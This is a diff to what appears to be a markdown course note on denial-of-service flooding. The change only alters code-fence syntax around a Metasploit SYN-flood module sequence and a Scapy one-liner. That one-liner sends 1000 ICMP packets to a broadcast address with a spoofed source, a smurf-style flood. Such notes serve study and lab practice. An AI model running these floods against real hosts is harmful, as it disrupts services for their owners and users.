@@ -21,7 +21,7 @@ Concept: Filling a storage area or communication channel until it can no longer 
 
 **Metasploit**
 
-```
+```sh
 use auxiliary/dos/tcp/synflood
 show options
 set RHOST=[IP_cible]
@@ -30,7 +30,7 @@ exploit
 
 **Scapy**
 
-```Python
+{% highlight python %}
 i = IP()
 i.dst = "192.168.133.255"
 
@@ -40,4 +40,4 @@ send(requete) # run wireshark
 
 # in 1 lign
 send(IP(dst="192.168.133.255", src="192.168.133.129")/ICMP(), count=1000, verbose=1)
-```
+{% endhighlight %}
